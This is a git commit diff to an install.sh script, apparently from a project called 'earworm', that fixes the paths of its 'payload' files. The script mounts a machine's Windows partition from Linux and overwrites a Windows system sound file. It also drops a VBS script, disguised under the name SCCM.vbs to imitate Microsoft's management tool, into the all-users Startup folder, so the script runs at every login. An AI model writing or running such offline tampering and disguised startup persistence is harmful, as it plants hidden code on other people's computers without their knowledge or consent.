2b7c9ed89fcb26b7777dd5ecfd8accbabb87d812
felix <felix.coulthard@gmail.com>
2022-06-19 20:05:03 +1000

    fix payload paths

--- install.sh
+++ install.sh
@@ -2,11 +2,11 @@
 winpart=`lsblk -l -o NAME,PARTLABEL | sed '/Basic data partition/!d; s/ .*//g'`; \
 echo'Found Windows Partition...'
 
-mount /dev/$winpart /mnt/windows; \
+mount /dev/$winpart /mnt/Windows; \
 echo'Mounted Windows Partition...'
-cp /usr/share/earworm/Alarm11.wav /mnt/Windows/Windows/Media/Alarm11.wav; \
+cp ./payload/Alarm11.wav /mnt/Windows/Windows/Media/Alarm11.wav; \
 echo'Copied Audio File...'
-cp /SCCM.vbs /mnt/Windows/ProgramData/Microsoft/Windows/Start\ Menu/Programs/StartUp/SCCM.vbs; \
+cp ./payload/SCCM.vbs /mnt/Windows/ProgramData/Microsoft/Windows/Start\ Menu/Programs/StartUp/SCCM.vbs; \
 echo'Copied VBS Script...'
 umount /dev/$winpart; \
 echo'Unmounted Windows Partion'
